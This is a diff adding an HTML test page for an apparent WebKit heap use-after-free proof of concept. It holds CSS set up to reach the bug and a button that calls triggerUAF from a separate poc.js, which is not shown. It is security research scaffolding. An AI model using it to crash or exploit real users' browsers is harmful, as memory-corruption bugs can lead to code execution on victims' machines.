@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug ----- </title>
+    <style>
+      .container {
+        overflow: hidden;
+        content-visibility: auto;
+        transform: translateZ(0);
+        position: relative;
+        width: 200px;
+        height: 200px;
+      }
+      .child {
+        width: 100px;
+        height: 100px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        background: blue;
+        transform: translateZ(0);
+      }
+      button {
+        margin-top: 20px;
+        padding: 10px;
+        font-size: 16px;
+      }
+    </style>
+</head>
+<body>
+    <h1>UAF: WebKit Heap Use-After-Free</h1>
+    <p>Click the button to see the bug in action. (Browser crashes or [+] UAF triggered)</p>
+    <button id="button">Click me</button>
+    <div class="container">
+      <div class="child"></div>
+    </div>
+    <script type="module">
+        import { triggerUAF } from './poc.js';
+        document.getElementById('button').addEventListener('click', () => {
+            try {
+                triggerUAF();
+            } catch (e) {
+                alert('Error: ' + e.message);
+            }
+        });
+    </script>
+</body>
+</html>
